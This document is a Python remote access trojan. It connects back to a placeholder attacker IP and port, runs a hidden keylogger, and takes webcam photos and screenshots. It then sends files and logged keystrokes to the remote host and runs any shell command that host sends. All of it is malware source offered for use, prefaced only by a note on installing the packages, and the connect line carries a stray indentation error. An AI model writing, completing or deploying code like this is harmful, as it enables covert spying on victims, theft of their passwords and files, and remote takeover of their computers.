#Note: You need to download all the packages before importing in my case i a using vs code to run this code .
import socket
import subprocess
import os
import cv2
import pyautogui
from threading import Thread
from pynput import keyboard

KEYLOG_FILE = "keylog.txt"

def capture_webcam_photo(filename="webcam_photo.jpg"):
    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        return "[!] Webcam not accessible."
    
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(filename, frame)
        cam.release()
        return f"[+] Saved: {filename}"
    else:
        cam.release()
        return "[!] Failed to capture image."

def take_screenshot(filename="screenshot.jpg"):
    try:
        image = pyautogui.screenshot()
        image.save(filename)
        return f"[+] Screenshot saved as: {filename}"
    except Exception as e:
        return f"[!] Screenshot error: {str(e)}"

def on_press(key):
    try:
        with open(KEYLOG_FILE, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(KEYLOG_FILE, "a") as log:
            log.write(f"[{key}]")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Start keylogger in background thread
Thread(target=start_keylogger, daemon=True).start()

s = socket.socket()
      s.connect(("[ip]", [port]))  # your attacker IP

while True:
    command = s.recv(1024).decode()

    if command == "webcam":
        output = capture_webcam_photo()
        s.send(output.encode())

    elif command == "screenshot":
        output = take_screenshot()
        s.send(output.encode())

    elif command.startswith("cd "):
        try:
            path = command[3:]
            os.chdir(path)
            s.send(f"[+] Changed dir to {path}".encode())
        except:
            s.send(b"[!] Failed to change directory")

    elif command.startswith("download "):
        file_path = command[9:]
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                s.send(f.read())
        else:
            s.send(b"[!] File not found")

    elif command == "keylog":
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, "rb") as f:
                s.send(f.read())
        else:
            s.send(b"[!] Keylog file not found")

    elif command == "delkeylog":
        try:
            os.remove(KEYLOG_FILE)
            s.send(b"[+] Keylog file deleted.")
        except FileNotFoundError:
            s.send(b"[!] Keylog file not found.")
        except Exception as e:
            s.send(f"[!] Error: {str(e)}".encode())

    else:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            s.send(output)
        except subprocess.CalledProcessError as e:
            s.send(e.output)
    
